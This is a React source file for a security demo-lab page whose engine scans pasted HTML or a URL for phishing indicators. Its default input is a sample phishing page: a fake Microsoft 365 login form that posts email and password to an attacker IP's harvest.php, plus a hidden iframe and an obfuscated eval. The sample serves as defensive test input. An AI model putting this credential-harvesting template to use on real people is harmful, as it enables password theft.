"use client"

import React, { useState } from "react"
import { Code, Globe, Play, FileText } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { DemoLabHeader } from "@/components/demo-lab/demo-lab-header"
import { ResultCard } from "@/components/demo-lab/result-card"
import { TriggeredRulesTable } from "@/components/demo-lab/triggered-rules-table"
import { EvidencePanel } from "@/components/demo-lab/evidence-panel"
import { RecommendationsPanel } from "@/components/demo-lab/recommendations-panel"
import { demoLabService, StandardEngineResponse } from "@/lib/services/demo-lab-service"

export default function M02ContentPage() {
  const [activeTab, setActiveTab] = useState<"url" | "html">("html")
  const [url, setUrl] = useState("https://example.com")
  const [rawHtml, setRawHtml] = useState(`<!DOCTYPE html>
<html>
<head><title>Microsoft 365 Security Check - Verify Password</title></head>
<body>
    <h2>Session Expired. Please sign in to renew your token.</h2>
    <form action="http://198.51.100.42:8080/harvest.php" method="POST">
        <input type="text" name="email" placeholder="Corporate Email" />
        <input type="password" name="password" placeholder="Password" />
        <button type="submit">Verify Now</button>
    </form>
    <iframe src="http://hidden-tracking-pixel.biz/embed" style="display:none;width:0;height:0;"></iframe>
    <script>
        document.oncontextmenu = function() { return false; };
        eval(atob("Y29uc29sZS5sb2coJ2tlcm5lbF9pbmplY3Rpb24nKQ=="));
    </script>
</body>
</html>`)
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState<StandardEngineResponse | null>(null)
  const [error, setError] = useState<string | null>(null)

  const handleScan = async () => {
    setLoading(true)
    setError(null)
    try {
      const data = await demoLabService.m02AnalyzeContent(
        activeTab === "url" ? { url } : { raw_html: rawHtml }
      )
      setResult(data)
    } catch (err: any) {
      setError(`Analysis error: ${err.message || String(err)}`)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="space-y-6 font-mono">
      <DemoLabHeader
        engineId="M-02"
        engineName="Web Content Intelligence"
        category="DOM, Security Headers & Script Analysis"
        description="Inspects DOM element hierarchy, form submission targets (detecting off-domain credential exfiltration), hidden iframes, anti-inspection JavaScript obfuscation, and defensive security headers (CSP, HSTS, X-Frame-Options) with strict client-safe SSRF boundary protection."
        analysisMode={activeTab === "url" ? "live" : "simulated"}
        onReset={() => setResult(null)}
        isAnalyzing={loading}
      />

      {/* Input Selector */}
      <div className="bg-[#0B0E14] border border-white/10 rounded-lg p-5 space-y-4">
        <div className="flex gap-2 border-b border-white/10 pb-3">
          <button
            type="button"
            onClick={() => setActiveTab("html")}
            className={`px-3 py-1.5 text-xs rounded transition-colors flex items-center gap-2 ${
              activeTab === "html"
                ? "bg-[#00E575]/10 text-[#00E575] border border-[#00E575]/30 font-bold"
                : "text-[#94A3B8] hover:text-[#F8FAFC]"
            }`}
          >
            <FileText className="w-3.5 h-3.5" />
            Paste Raw HTML DOM (Safe Sandbox)
          </button>
          <button
            type="button"
            onClick={() => setActiveTab("url")}
            className={`px-3 py-1.5 text-xs rounded transition-colors flex items-center gap-2 ${
              activeTab === "url"
                ? "bg-[#00E575]/10 text-[#00E575] border border-[#00E575]/30 font-bold"
                : "text-[#94A3B8] hover:text-[#F8FAFC]"
            }`}
          >
            <Globe className="w-3.5 h-3.5" />
            Live HTTP Target (SSRF-Protected)
          </button>
        </div>

        {activeTab === "html" ? (
          <div className="space-y-2">
            <div className="flex justify-between text-xs text-[#64748B]">
              <span>RAW HTML PAYLOAD</span>
              <span>Never executed; strictly parsed as passive text</span>
            </div>
            <Textarea
              value={rawHtml}
              onChange={(e) => setRawHtml(e.target.value)}
              rows={8}
              className="bg-[#07090E] border-white/10 text-xs font-mono text-[#F8FAFC]"
            />
          </div>
        ) : (
          <div className="space-y-2">
            <div className="text-xs text-[#64748B]">TARGET WEB ADDRESS</div>
            <Input
              value={url}
              onChange={(e) => setUrl(e.target.value)}
              placeholder="https://example.com"
              className="bg-[#07090E] border-white/10 text-xs font-mono text-[#F8FAFC]"
            />
          </div>
        )}

        <div className="flex justify-end pt-2">
          <Button
            onClick={handleScan}
            disabled={loading}
            className="bg-[#00E575] hover:bg-[#00c966] text-[#07090E] font-bold text-xs"
          >
            <Play className="w-3.5 h-3.5 mr-1.5 fill-current" />
            {loading ? "Analyzing DOM..." : "Analyse Web Content"}
          </Button>
        </div>
      </div>

      {error && (
        <div className="p-4 bg-red-500/10 border border-red-500/30 rounded text-xs text-red-400">
          {error}
        </div>
      )}

      {result && (
        <div className="space-y-6">
          <ResultCard result={result} />
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <TriggeredRulesTable rules={result.triggered_rules} />
            <div className="space-y-6">
              <RecommendationsPanel recommendations={result.recommendations} />
              <EvidencePanel evidence={result.evidence} />
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
